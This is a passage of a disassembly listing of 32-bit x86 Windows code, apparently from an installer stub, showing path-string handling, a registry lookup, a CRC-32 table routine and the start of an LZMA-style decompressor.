  406575:	33 f6                	xor    %esi,%esi
  406577:	39 35 e4 43 42 00    	cmp    %esi,0x4243e4
  40657d:	74 07                	je     0x406586
  40657f:	c7 45 0c 04 00 00 00 	movl   $0x4,0xc(%ebp)
  406586:	84 c9                	test   %cl,%cl
  406588:	79 35                	jns    0x4065bf
  40658a:	8b c1                	mov    %ecx,%eax
  40658c:	83 e1 3f             	and    $0x3f,%ecx
  40658f:	03 0d 98 43 42 00    	add    0x424398,%ecx
  406595:	83 e0 40             	and    $0x40,%eax
  406598:	50                   	push   %eax
  406599:	57                   	push   %edi
  40659a:	51                   	push   %ecx
  40659b:	68 a8 83 40 00       	push   $0x4083a8
  4065a0:	68 02 00 00 80       	push   $0x80000002
  4065a5:	e8 42 fd ff ff       	call   0x4062ec
  4065aa:	80 3f 00             	cmpb   $0x0,(%edi)
  4065ad:	0f 85 ad 00 00 00    	jne    0x406660
  4065b3:	53                   	push   %ebx
  4065b4:	57                   	push   %edi
  4065b5:	e8 de fe ff ff       	call   0x406498
  4065ba:	e9 9c 00 00 00       	jmp    0x40665b
  4065bf:	83 f9 25             	cmp    $0x25,%ecx
  4065c2:	75 11                	jne    0x4065d5
  4065c4:	68 00 04 00 00       	push   $0x400
  4065c9:	57                   	push   %edi
  4065ca:	ff 15 50 81 40 00    	call   *0x408150
  4065d0:	e9 86 00 00 00       	jmp    0x40665b
  4065d5:	83 f9 24             	cmp    $0x24,%ecx
  4065d8:	75 0f                	jne    0x4065e9
  4065da:	68 00 04 00 00       	push   $0x400
  4065df:	57                   	push   %edi
  4065e0:	ff 15 a4 80 40 00    	call   *0x4080a4
  4065e6:	89 75 0c             	mov    %esi,0xc(%ebp)
  4065e9:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4065ec:	74 6d                	je     0x40665b
  4065ee:	ff 4d 0c             	decl   0xc(%ebp)
  4065f1:	33 c9                	xor    %ecx,%ecx
  4065f3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4065f6:	8b 5c 85 e8          	mov    -0x18(%ebp,%eax,4),%ebx
  4065fa:	a1 64 43 42 00       	mov    0x424364,%eax
  4065ff:	83 e3 bf             	and    $0xffffffbf,%ebx
  406602:	8b f3                	mov    %ebx,%esi
  406604:	81 e6 00 80 00 00    	and    $0x8000,%esi
  40660a:	3b c1                	cmp    %ecx,%eax
  40660c:	74 15                	je     0x406623
  40660e:	39 4d f8             	cmp    %ecx,-0x8(%ebp)
  406611:	74 10                	je     0x406623
  406613:	57                   	push   %edi
  406614:	51                   	push   %ecx
  406615:	51                   	push   %ecx
  406616:	53                   	push   %ebx
  406617:	ff 35 68 43 42 00    	push   0x424368
  40661d:	ff d0                	call   *%eax
  40661f:	85 c0                	test   %eax,%eax
  406621:	74 38                	je     0x40665b
  406623:	6a 07                	push   $0x7
  406625:	e8 03 02 00 00       	call   0x40682d
  40662a:	0f b6 cb             	movzbl %bl,%ecx
  40662d:	56                   	push   %esi
  40662e:	51                   	push   %ecx
  40662f:	ff 35 68 43 42 00    	push   0x424368
  406635:	ff d0                	call   *%eax
  406637:	8b f0                	mov    %eax,%esi
  406639:	85 f6                	test   %esi,%esi
  40663b:	74 15                	je     0x406652
  40663d:	57                   	push   %edi
  40663e:	56                   	push   %esi
  40663f:	ff 15 68 81 40 00    	call   *0x408168
  406645:	56                   	push   %esi
  406646:	8b d8                	mov    %eax,%ebx
  406648:	ff 15 8c 82 40 00    	call   *0x40828c
  40664e:	85 db                	test   %ebx,%ebx
  406650:	75 09                	jne    0x40665b
  406652:	80 27 00             	andb   $0x0,(%edi)
  406655:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406659:	75 93                	jne    0x4065ee
  40665b:	80 3f 00             	cmpb   $0x0,(%edi)
  40665e:	74 11                	je     0x406671
  406660:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  406664:	75 0b                	jne    0x406671
  406666:	68 d4 83 40 00       	push   $0x4083d4
  40666b:	57                   	push   %edi
  40666c:	e8 b0 fd ff ff       	call   0x406421
  406671:	57                   	push   %edi
  406672:	e8 88 00 00 00       	call   0x4066ff
  406677:	eb 44                	jmp    0x4066bd
  406679:	80 fa 03             	cmp    $0x3,%dl
  40667c:	75 2e                	jne    0x4066ac
  40667e:	83 fe 1d             	cmp    $0x1d,%esi
  406681:	75 0e                	jne    0x406691
  406683:	ff 35 68 43 42 00    	push   0x424368
  406689:	57                   	push   %edi
  40668a:	e8 d4 fc ff ff       	call   0x406363
  40668f:	eb 11                	jmp    0x4066a2
  406691:	8b c6                	mov    %esi,%eax
  406693:	c1 e0 0a             	shl    $0xa,%eax
  406696:	05 00 50 42 00       	add    $0x425000,%eax
  40669b:	50                   	push   %eax
  40669c:	57                   	push   %edi
  40669d:	e8 63 fd ff ff       	call   0x406405
  4066a2:	83 c6 eb             	add    $0xffffffeb,%esi
  4066a5:	83 fe 07             	cmp    $0x7,%esi
  4066a8:	73 13                	jae    0x4066bd
  4066aa:	eb c5                	jmp    0x406671
  4066ac:	80 fa 01             	cmp    $0x1,%dl
  4066af:	75 0c                	jne    0x4066bd
  4066b1:	83 c8 ff             	or     $0xffffffff,%eax
  4066b4:	2b c6                	sub    %esi,%eax
  4066b6:	50                   	push   %eax
  4066b7:	57                   	push   %edi
  4066b8:	e8 db fd ff ff       	call   0x406498
  4066bd:	57                   	push   %edi
  4066be:	e8 58 fd ff ff       	call   0x40641b
  4066c3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4066c6:	03 f8                	add    %eax,%edi
  4066c8:	b8 00 33 42 00       	mov    $0x423300,%eax
  4066cd:	eb 0d                	jmp    0x4066dc
  4066cf:	75 08                	jne    0x4066d9
  4066d1:	8a 11                	mov    (%ecx),%dl
  4066d3:	88 17                	mov    %dl,(%edi)
  4066d5:	47                   	inc    %edi
  4066d6:	41                   	inc    %ecx
  4066d7:	eb 03                	jmp    0x4066dc
  4066d9:	88 17                	mov    %dl,(%edi)
  4066db:	47                   	inc    %edi
  4066dc:	8a 11                	mov    (%ecx),%dl
  4066de:	84 d2                	test   %dl,%dl
  4066e0:	0f 85 08 fe ff ff    	jne    0x4064ee
  4066e6:	80 27 00             	andb   $0x0,(%edi)
  4066e9:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4066ed:	5f                   	pop    %edi
  4066ee:	5e                   	pop    %esi
  4066ef:	5b                   	pop    %ebx
  4066f0:	74 09                	je     0x4066fb
  4066f2:	50                   	push   %eax
  4066f3:	ff 75 08             	push   0x8(%ebp)
  4066f6:	e8 0a fd ff ff       	call   0x406405
  4066fb:	c9                   	leave
  4066fc:	c2 08 00             	ret    $0x8
  4066ff:	53                   	push   %ebx
  406700:	56                   	push   %esi
  406701:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406705:	57                   	push   %edi
  406706:	80 3e 5c             	cmpb   $0x5c,(%esi)
  406709:	75 15                	jne    0x406720
  40670b:	80 7e 01 5c          	cmpb   $0x5c,0x1(%esi)
  40670f:	75 0f                	jne    0x406720
  406711:	80 7e 02 3f          	cmpb   $0x3f,0x2(%esi)
  406715:	75 09                	jne    0x406720
  406717:	80 7e 03 5c          	cmpb   $0x5c,0x3(%esi)
  40671b:	75 03                	jne    0x406720
  40671d:	83 c6 04             	add    $0x4,%esi
  406720:	80 3e 00             	cmpb   $0x0,(%esi)
  406723:	74 0c                	je     0x406731
  406725:	56                   	push   %esi
  406726:	e8 d9 f6 ff ff       	call   0x405e04
  40672b:	85 c0                	test   %eax,%eax
  40672d:	74 02                	je     0x406731
  40672f:	46                   	inc    %esi
  406730:	46                   	inc    %esi
  406731:	8a 06                	mov    (%esi),%al
  406733:	8b de                	mov    %esi,%ebx
  406735:	84 c0                	test   %al,%al
  406737:	8b fe                	mov    %esi,%edi
  406739:	74 39                	je     0x406774
  40673b:	55                   	push   %ebp
  40673c:	8b 2d f4 81 40 00    	mov    0x4081f4,%ebp
  406742:	3c 1f                	cmp    $0x1f,%al
  406744:	76 22                	jbe    0x406768
  406746:	50                   	push   %eax
  406747:	68 08 a4 40 00       	push   $0x40a408
  40674c:	e8 71 f6 ff ff       	call   0x405dc2
  406751:	80 38 00             	cmpb   $0x0,(%eax)
  406754:	75 12                	jne    0x406768
  406756:	56                   	push   %esi
  406757:	ff d5                	call   *%ebp
  406759:	2b c6                	sub    %esi,%eax
  40675b:	50                   	push   %eax
  40675c:	56                   	push   %esi
  40675d:	57                   	push   %edi
  40675e:	e8 f0 f7 ff ff       	call   0x405f53
  406763:	57                   	push   %edi
  406764:	ff d5                	call   *%ebp
  406766:	8b f8                	mov    %eax,%edi
  406768:	56                   	push   %esi
  406769:	ff d5                	call   *%ebp
  40676b:	8b f0                	mov    %eax,%esi
  40676d:	8a 06                	mov    (%esi),%al
  40676f:	84 c0                	test   %al,%al
  406771:	75 cf                	jne    0x406742
  406773:	5d                   	pop    %ebp
  406774:	80 27 00             	andb   $0x0,(%edi)
  406777:	57                   	push   %edi
  406778:	53                   	push   %ebx
  406779:	ff 15 64 82 40 00    	call   *0x408264
  40677f:	8b f8                	mov    %eax,%edi
  406781:	8a 07                	mov    (%edi),%al
  406783:	3c 20                	cmp    $0x20,%al
  406785:	74 04                	je     0x40678b
  406787:	3c 5c                	cmp    $0x5c,%al
  406789:	75 07                	jne    0x406792
  40678b:	80 27 00             	andb   $0x0,(%edi)
  40678e:	3b df                	cmp    %edi,%ebx
  406790:	72 e5                	jb     0x406777
  406792:	5f                   	pop    %edi
  406793:	5e                   	pop    %esi
  406794:	5b                   	pop    %ebx
  406795:	c2 04 00             	ret    $0x4
  406798:	56                   	push   %esi
  406799:	be a8 21 42 00       	mov    $0x4221a8,%esi
  40679e:	56                   	push   %esi
  40679f:	ff 74 24 0c          	push   0xc(%esp)
  4067a3:	ff 15 34 81 40 00    	call   *0x408134
  4067a9:	83 f8 ff             	cmp    $0xffffffff,%eax
  4067ac:	74 0b                	je     0x4067b9
  4067ae:	50                   	push   %eax
  4067af:	ff 15 2c 81 40 00    	call   *0x40812c
  4067b5:	8b c6                	mov    %esi,%eax
  4067b7:	eb 02                	jmp    0x4067bb
  4067b9:	33 c0                	xor    %eax,%eax
  4067bb:	5e                   	pop    %esi
  4067bc:	c2 04 00             	ret    $0x4
  4067bf:	55                   	push   %ebp
  4067c0:	8b ec                	mov    %esp,%ebp
  4067c2:	81 ec 20 01 00 00    	sub    $0x120,%esp
  4067c8:	56                   	push   %esi
  4067c9:	be 04 01 00 00       	mov    $0x104,%esi
  4067ce:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4067d4:	56                   	push   %esi
  4067d5:	50                   	push   %eax
  4067d6:	ff 15 50 81 40 00    	call   *0x408150
  4067dc:	3b c6                	cmp    %esi,%eax
  4067de:	5e                   	pop    %esi
  4067df:	76 02                	jbe    0x4067e3
  4067e1:	33 c0                	xor    %eax,%eax
  4067e3:	85 c0                	test   %eax,%eax
  4067e5:	74 0e                	je     0x4067f5
  4067e7:	80 bc 05 df fe ff ff 	cmpb   $0x5c,-0x121(%ebp,%eax,1)
  4067ee:	5c 
  4067ef:	74 04                	je     0x4067f5
  4067f1:	33 c9                	xor    %ecx,%ecx
  4067f3:	eb 03                	jmp    0x4067f8
  4067f5:	33 c9                	xor    %ecx,%ecx
  4067f7:	41                   	inc    %ecx
  4067f8:	ff 75 08             	push   0x8(%ebp)
  4067fb:	8d 89 14 a0 40 00    	lea    0x40a014(%ecx),%ecx
  406801:	8d 84 05 e0 fe ff ff 	lea    -0x120(%ebp,%eax,1),%eax
  406808:	51                   	push   %ecx
  406809:	68 14 a4 40 00       	push   $0x40a414
  40680e:	50                   	push   %eax
  40680f:	ff 15 18 82 40 00    	call   *0x408218
  406815:	83 c4 10             	add    $0x10,%esp
  406818:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  40681e:	6a 08                	push   $0x8
  406820:	6a 00                	push   $0x0
  406822:	50                   	push   %eax
  406823:	ff 15 14 81 40 00    	call   *0x408114
  406829:	c9                   	leave
  40682a:	c2 04 00             	ret    $0x4
  40682d:	8b 44 24 04          	mov    0x4(%esp),%eax
  406831:	56                   	push   %esi
  406832:	8b f0                	mov    %eax,%esi
  406834:	57                   	push   %edi
  406835:	c1 e6 03             	shl    $0x3,%esi
  406838:	8b be 50 a2 40 00    	mov    0x40a250(%esi),%edi
  40683e:	57                   	push   %edi
  40683f:	ff 15 10 81 40 00    	call   *0x408110
  406845:	85 c0                	test   %eax,%eax
  406847:	75 0a                	jne    0x406853
  406849:	57                   	push   %edi
  40684a:	e8 70 ff ff ff       	call   0x4067bf
  40684f:	85 c0                	test   %eax,%eax
  406851:	74 0f                	je     0x406862
  406853:	ff b6 54 a2 40 00    	push   0x40a254(%esi)
  406859:	50                   	push   %eax
  40685a:	ff 15 54 81 40 00    	call   *0x408154
  406860:	eb 02                	jmp    0x406864
  406862:	33 c0                	xor    %eax,%eax
  406864:	5f                   	pop    %edi
  406865:	5e                   	pop    %esi
  406866:	c2 04 00             	ret    $0x4
  406869:	55                   	push   %ebp
  40686a:	8b ec                	mov    %esp,%ebp
  40686c:	83 ec 1c             	sub    $0x1c,%esp
  40686f:	56                   	push   %esi
  406870:	8b 75 08             	mov    0x8(%ebp),%esi
  406873:	57                   	push   %edi
  406874:	8b 3d 68 82 40 00    	mov    0x408268,%edi
  40687a:	eb 0a                	jmp    0x406886
  40687c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40687f:	50                   	push   %eax
  406880:	ff 15 70 82 40 00    	call   *0x408270
  406886:	6a 01                	push   $0x1
  406888:	56                   	push   %esi
  406889:	56                   	push   %esi
  40688a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40688d:	6a 00                	push   $0x0
  40688f:	50                   	push   %eax
  406890:	ff d7                	call   *%edi
  406892:	85 c0                	test   %eax,%eax
  406894:	75 e6                	jne    0x40687c
  406896:	5f                   	pop    %edi
  406897:	5e                   	pop    %esi
  406898:	c9                   	leave
  406899:	c2 04 00             	ret    $0x4
  40689c:	ff 25 54 81 40 00    	jmp    *0x408154
  4068a2:	55                   	push   %ebp
  4068a3:	8b ec                	mov    %esp,%ebp
  4068a5:	51                   	push   %ecx
  4068a6:	56                   	push   %esi
  4068a7:	8b 35 5c 81 40 00    	mov    0x40815c,%esi
  4068ad:	57                   	push   %edi
  4068ae:	6a 64                	push   $0x64
  4068b0:	ff 75 08             	push   0x8(%ebp)
  4068b3:	ff d6                	call   *%esi
  4068b5:	bf 02 01 00 00       	mov    $0x102,%edi
  4068ba:	eb 0e                	jmp    0x4068ca
  4068bc:	6a 0f                	push   $0xf
  4068be:	e8 a6 ff ff ff       	call   0x406869
  4068c3:	6a 64                	push   $0x64
  4068c5:	ff 75 08             	push   0x8(%ebp)
  4068c8:	ff d6                	call   *%esi
  4068ca:	3b c7                	cmp    %edi,%eax
  4068cc:	74 ee                	je     0x4068bc
  4068ce:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4068d1:	50                   	push   %eax
  4068d2:	ff 75 08             	push   0x8(%ebp)
  4068d5:	ff 15 58 81 40 00    	call   *0x408158
  4068db:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4068de:	5f                   	pop    %edi
  4068df:	5e                   	pop    %esi
  4068e0:	c9                   	leave
  4068e1:	c2 04 00             	ret    $0x4
  4068e4:	83 3d ec 2e 42 00 00 	cmpl   $0x0,0x422eec
  4068eb:	56                   	push   %esi
  4068ec:	75 2d                	jne    0x40691b
  4068ee:	33 c9                	xor    %ecx,%ecx
  4068f0:	6a 08                	push   $0x8
  4068f2:	8b c1                	mov    %ecx,%eax
  4068f4:	5e                   	pop    %esi
  4068f5:	8b d0                	mov    %eax,%edx
  4068f7:	80 e2 01             	and    $0x1,%dl
  4068fa:	f6 da                	neg    %dl
  4068fc:	1b d2                	sbb    %edx,%edx
  4068fe:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406904:	d1 e8                	shr    $1,%eax
  406906:	33 c2                	xor    %edx,%eax
  406908:	4e                   	dec    %esi
  406909:	75 ea                	jne    0x4068f5
  40690b:	89 04 8d e8 2e 42 00 	mov    %eax,0x422ee8(,%ecx,4)
  406912:	41                   	inc    %ecx
  406913:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406919:	7c d5                	jl     0x4068f0
  40691b:	8b 54 24 10          	mov    0x10(%esp),%edx
  40691f:	8b 44 24 08          	mov    0x8(%esp),%eax
  406923:	85 d2                	test   %edx,%edx
  406925:	f7 d0                	not    %eax
  406927:	76 23                	jbe    0x40694c
  406929:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40692d:	57                   	push   %edi
  40692e:	0f b6 39             	movzbl (%ecx),%edi
  406931:	8b f0                	mov    %eax,%esi
  406933:	81 e6 ff 00 00 00    	and    $0xff,%esi
  406939:	33 f7                	xor    %edi,%esi
  40693b:	c1 e8 08             	shr    $0x8,%eax
  40693e:	8b 34 b5 e8 2e 42 00 	mov    0x422ee8(,%esi,4),%esi
  406945:	33 c6                	xor    %esi,%eax
  406947:	41                   	inc    %ecx
  406948:	4a                   	dec    %edx
  406949:	75 e3                	jne    0x40692e
  40694b:	5f                   	pop    %edi
  40694c:	f7 d0                	not    %eax
  40694e:	5e                   	pop    %esi
  40694f:	c2 0c 00             	ret    $0xc
  406952:	b8 80 00 00 00       	mov    $0x80,%eax
  406957:	48                   	dec    %eax
  406958:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  40695c:	75 f9                	jne    0x406957
  40695e:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  406962:	33 c0                	xor    %eax,%eax
  406964:	40                   	inc    %eax
  406965:	89 41 68             	mov    %eax,0x68(%ecx)
  406968:	89 41 64             	mov    %eax,0x64(%ecx)
  40696b:	89 41 60             	mov    %eax,0x60(%ecx)
  40696e:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406971:	c3                   	ret
  406972:	55                   	push   %ebp
  406973:	8b ec                	mov    %esp,%ebp
  406975:	81 ec 90 00 00 00    	sub    $0x90,%esp
  40697b:	53                   	push   %ebx
  40697c:	56                   	push   %esi
  40697d:	57                   	push   %edi
  40697e:	6a 22                	push   $0x22
  406980:	8b f1                	mov    %ecx,%esi
  406982:	59                   	pop    %ecx
  406983:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  406989:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  40698f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406991:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  406995:	75 08                	jne    0x40699f
  406997:	33 c0                	xor    %eax,%eax
  406999:	40                   	inc    %eax
  40699a:	e9 20 0a 00 00       	jmp    0x4073bf
  40699f:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  4069a2:	8b 75 ac             	mov    -0x54(%ebp),%esi
  4069a5:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  4069ab:	83 f8 1c             	cmp    $0x1c,%eax
  4069ae:	0f 87 08 0a 00 00    	ja     0x4073bc
  4069b4:	ff 24 85 c4 73 40 00 	jmp    *0x4073c4(,%eax,4)
  4069bb:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4069bf:	0f 84 e2 09 00 00    	je     0x4073a7
  4069c5:	8b 45 90             	mov    -0x70(%ebp),%eax
  4069c8:	ff 4d 94             	decl   -0x6c(%ebp)
  4069cb:	ff 45 90             	incl   -0x70(%ebp)
  4069ce:	8a 00                	mov    (%eax),%al
  4069d0:	3c e1                	cmp    $0xe1,%al
  4069d2:	0f 87 e4 09 00 00    	ja     0x4073bc
  4069d8:	0f b6 c0             	movzbl %al,%eax
  4069db:	6a 2d                	push   $0x2d
  4069dd:	99                   	cltd
  4069de:	59                   	pop    %ecx
  4069df:	f7 f9                	idiv   %ecx
  4069e1:	6a 09                	push   $0x9
  4069e3:	59                   	pop    %ecx
  4069e4:	8b f0                	mov    %eax,%esi
  4069e6:	0f b6 c2             	movzbl %dl,%eax
  4069e9:	99                   	cltd
  4069ea:	f7 f9                	idiv   %ecx
  4069ec:	8b ce                	mov    %esi,%ecx
  4069ee:	0f b6 fa             	movzbl %dl,%edi
  4069f1:	33 d2                	xor    %edx,%edx
  4069f3:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  4069f6:	42                   	inc    %edx
  4069f7:	d3 e2                	shl    %cl,%edx
  4069f9:	8b c8                	mov    %eax,%ecx
  4069fb:	4a                   	dec    %edx
  4069fc:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4069ff:	33 d2                	xor    %edx,%edx
  406a01:	42                   	inc    %edx
  406a02:	d3 e2                	shl    %cl,%edx
  406a04:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  406a07:	be 00 03 00 00       	mov    $0x300,%esi
  406a0c:	d3 e6                	shl    %cl,%esi
  406a0e:	4a                   	dec    %edx
  406a0f:	89 55 e8             	mov    %edx,-0x18(%ebp)
  406a12:	81 c6 36 07 00 00    	add    $0x736,%esi
  406a18:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  406a1b:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  406a1e:	74 26                	je     0x406a46
  406a20:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406a24:	74 09                	je     0x406a2f
  406a26:	ff 75 fc             	push   -0x4(%ebp)
  406a29:	ff 15 08 81 40 00    	call   *0x408108
  406a2f:	57                   	push   %edi
  406a30:	6a 40                	push   $0x40
  406a32:	ff 15 0c 81 40 00    	call   *0x40810c
  406a38:	85 c0                	test   %eax,%eax
  406a3a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406a3d:	0f 84 79 09 00 00    	je     0x4073bc
  406a43:	89 7d 88             	mov    %edi,-0x78(%ebp)
  406a46:	85 f6                	test   %esi,%esi
  406a48:	74 0c                	je     0x406a56
  406a4a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a4d:	4e                   	dec    %esi
  406a4e:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
  406a54:	75 f4                	jne    0x406a4a
  406a56:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  406a5a:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406a5e:	eb 26                	jmp    0x406a86
  406a60:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406a64:	0f 84 a6 08 00 00    	je     0x407310
  406a6a:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406a6d:	ff 4d 94             	decl   -0x6c(%ebp)
  406a70:	8b c8                	mov    %eax,%ecx
  406a72:	8b 45 90             	mov    -0x70(%ebp),%eax
  406a75:	c1 e1 03             	shl    $0x3,%ecx
  406a78:	0f b6 00             	movzbl (%eax),%eax
  406a7b:	d3 e0                	shl    %cl,%eax
  406a7d:	09 45 c0             	or     %eax,-0x40(%ebp)
  406a80:	ff 45 90             	incl   -0x70(%ebp)
  406a83:	ff 45 b8             	incl   -0x48(%ebp)
  406a86:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  406a8a:	7c d4                	jl     0x406a60
  406a8c:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406a8f:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406a92:	74 28                	je     0x406abc
  406a94:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406a98:	89 45 8c             	mov    %eax,-0x74(%ebp)
  406a9b:	74 09                	je     0x406aa6
  406a9d:	ff 75 f8             	push   -0x8(%ebp)
  406aa0:	ff 15 08 81 40 00    	call   *0x408108
  406aa6:	ff 75 c0             	push   -0x40(%ebp)
  406aa9:	6a 40                	push   $0x40
  406aab:	ff 15 0c 81 40 00    	call   *0x40810c
  406ab1:	85 c0                	test   %eax,%eax
  406ab3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406ab6:	0f 84 00 09 00 00    	je     0x4073bc
  406abc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406abf:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  406ac2:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  406ac9:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  406ace:	eb 21                	jmp    0x406af1
  406ad0:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406ad4:	0f 84 45 08 00 00    	je     0x40731f
  406ada:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406add:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406ae0:	ff 4d 94             	decl   -0x6c(%ebp)
  406ae3:	0f b6 09             	movzbl (%ecx),%ecx
  406ae6:	c1 e0 08             	shl    $0x8,%eax
  406ae9:	0b c1                	or     %ecx,%eax
  406aeb:	ff 45 90             	incl   -0x70(%ebp)
  406aee:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406af1:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406af4:	ff 4d b8             	decl   -0x48(%ebp)
  406af7:	85 c0                	test   %eax,%eax
  406af9:	75 d5                	jne    0x406ad0
  406afb:	8b 45 a0             	mov    -0x60(%ebp),%eax
  406afe:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406b01:	23 45 e4             	and    -0x1c(%ebp),%eax
  406b04:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  406b0b:	00 00 00 
  406b0e:	c1 e1 04             	shl    $0x4,%ecx
  406b11:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  406b14:	03 c8                	add    %eax,%ecx
  406b16:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b19:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  406b1c:	e9 6c 06 00 00       	jmp    0x40718d
  406b21:	33 d2                	xor    %edx,%edx
  406b23:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  406b26:	75 6f                	jne    0x406b97
  406b28:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  406b2c:	8b 75 a0             	mov    -0x60(%ebp),%esi
  406b2f:	b1 08                	mov    $0x8,%cl
  406b31:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  406b34:	23 75 e8             	and    -0x18(%ebp),%esi
  406b37:	d3 e8                	shr    %cl,%eax
  406b39:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  406b3c:	d3 e6                	shl    %cl,%esi
  406b3e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406b41:	03 c6                	add    %esi,%eax
  406b43:	8d 04 40             	lea    (%eax,%eax,2),%eax
  406b46:	c1 e0 09             	shl    $0x9,%eax
  406b49:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  406b4d:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  406b54:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406b57:	7d 05                	jge    0x406b5e
  406b59:	89 55 c8             	mov    %edx,-0x38(%ebp)
  406b5c:	eb 10                	jmp    0x406b6e
  406b5e:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  406b62:	7d 06                	jge    0x406b6a
  406b64:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  406b68:	eb 04                	jmp    0x406b6e
  406b6a:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  406b6e:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  406b71:	74 1c                	je     0x406b8f
  406b73:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406b76:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406b79:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406b7c:	72 03                	jb     0x406b81
  406b7e:	03 45 8c             	add    -0x74(%ebp),%eax
  406b81:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406b84:	33 db                	xor    %ebx,%ebx
  406b86:	43                   	inc    %ebx
  406b87:	8a 04 08             	mov    (%eax,%ecx,1),%al
  406b8a:	88 45 a5             	mov    %al,-0x5b(%ebp)
  406b8d:	eb 68                	jmp    0x406bf7
  406b8f:	33 db                	xor    %ebx,%ebx
  406b91:	43                   	inc    %ebx
  406b92:	e9 cd 01 00 00       	jmp    0x406d64
  406b97:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b9a:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406b9d:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  406ba4:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  406bab:	00 00 00 
  406bae:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  406bb5:	e9 d3 05 00 00       	jmp    0x40718d
  406bba:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406bbe:	0f 84 67 07 00 00    	je     0x40732b
  406bc4:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406bc7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406bca:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406bce:	0f b6 09             	movzbl (%ecx),%ecx
  406bd1:	ff 4d 94             	decl   -0x6c(%ebp)
  406bd4:	c1 e0 08             	shl    $0x8,%eax
  406bd7:	0b c1                	or     %ecx,%eax
  406bd9:	ff 45 90             	incl   -0x70(%ebp)
  406bdc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406bdf:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406be2:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406be5:	0f 85 ad 00 00 00    	jne    0x406c98
  406beb:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406bf1:	0f 8d 05 01 00 00    	jge    0x406cfc
  406bf7:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
